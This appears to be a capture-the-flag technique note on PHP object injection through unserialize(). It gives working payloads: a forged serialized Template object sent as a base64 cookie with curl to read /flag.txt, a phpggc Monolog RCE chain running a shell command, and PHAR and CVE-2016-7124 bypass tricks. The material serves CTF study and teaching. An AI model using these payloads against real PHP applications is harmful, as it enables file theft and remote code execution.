---
id: php-object-injection-unserialize-pop-chain
category: WEB
tags: [php, unserialize, object-injection, deserialization, pop-chain, magic-method, wakeup, destruct, tostring, phar, gadget-chain, phpggc, insecure-deserialization]
tools: []
manuals: []
title: "PHP object injection: forge a serialized object to trigger a __wakeup/__destruct gadget"
difficulty: medium
created: 2026-11-23
updated: 2026-11-23
related: [php-type-juggling-magic-hash, ssti-template-injection, unrestricted-upload-extension-rce, xxe-external-entity-file-read]
---

## How to recognize this pattern

- A PHP app calls `unserialize()` on **attacker-controlled data**: a cookie, a hidden form field, a
  query param — often base64-encoded first. Signal: a cookie whose decoded value starts with
  `O:8:"..."` or `a:2:{...}` (PHP serialized format).
- The source (given or leaked) defines a class with a **magic method** that does something dangerous:
  `__wakeup()` / `__destruct()` reading a file or running a command, `__toString()` concatenated
  somewhere, `__call`. These auto-fire on deserialization or object use.
- Prompt hints: "session resumption", "serialized", a `Template`/`Logger`/`File` class with a `path`
  or `cmd` property.

## PHP serialized format (read it fluently)

```
O:8:"Template":2:{s:4:"path";s:9:"/flag.txt";s:7:"content";s:0:"";}
│  │ │          │ └ 2 properties
│  │ │          └ class name length = 8
│  │ └ class name
│  └ "Object"                    s:9 = string of 9 bytes; the number is the byte length
```
Every length must be exact (bytes, not chars) or `unserialize` rejects it.

## Method

### 1. Find the gadget
Read the provided source for a class whose magic method touches the filesystem or a sink:
```php
class Template {
  public $path, $content;
  function __wakeup(){ $this->content = file_get_contents($this->path); echo $this->content; }
}
```
`__wakeup()` runs automatically on `unserialize()` — ideal.

### 2. Craft the object and deliver it
```bash
O='O:8:"Template":2:{s:4:"path";s:9:"/flag.txt";s:7:"content";s:0:"";}'
C=$(printf '%s' "$O" | base64 -w0)
curl -s https://target/ -H "Cookie: session=$C"
```
Build it in PHP when property counts/visibility get fiddly (private props use `\0Class\0prop` keys):
```php
php -r '$t=new Template(); $t->path="/flag.txt"; echo base64_encode(serialize($t));'
```

### 3. No obvious gadget in app code → PHAR or framework chain
- **phpggc** generates ready gadget chains for Laravel, Symfony, Monolog, Guzzle, etc.:
  ```bash
  phpggc Monolog/RCE1 system 'cat /flag.txt'
  ```
- **PHAR deserialization**: if no direct `unserialize()` but a file op (`file_exists`, `fopen`,
  `getimagesize`) runs on a `phar://` path you control, the PHAR metadata is auto-deserialized.
  Wrap the gadget in a PHAR and reference `phar://upload.jpg`.

## Gotchas

- **Property count and lengths must be exact.** `O:8:"Template":2:` means 2 properties; wrong count
  aborts parsing. Count **bytes** for UTF-8 strings.
- **Private/protected** properties serialize with NUL-byte-wrapped keys (`\x00Template\x00path`); copy
  them verbatim (base64 preserves the NULs — build in PHP, don't hand-type).
- `__wakeup()` can be **skipped** with a property-count bug (`CVE-2016-7124`: set the count larger than
  actual to bypass `__wakeup`), which is sometimes needed to reach `__destruct` instead.
- PHP 7.4+ prefers `__unserialize()`/`__serialize()`; `__wakeup` still fires if defined.
- Base64 transport: decode/encode cleanly — a stray `+`/`/` URL-mangle breaks the blob. URL-encode the
  cookie value.

## Cross-reference

- `php-type-juggling-magic-hash`: sibling PHP-logic bug; chain when the gadget guards on a loose `==`.
- `unrestricted-upload-extension-rce`: pairs with PHAR deserialization (upload the PHAR as an image).
- `ssti-template-injection` / `xxe-external-entity-file-read`: sibling "server parses attacker input"
  primitives.
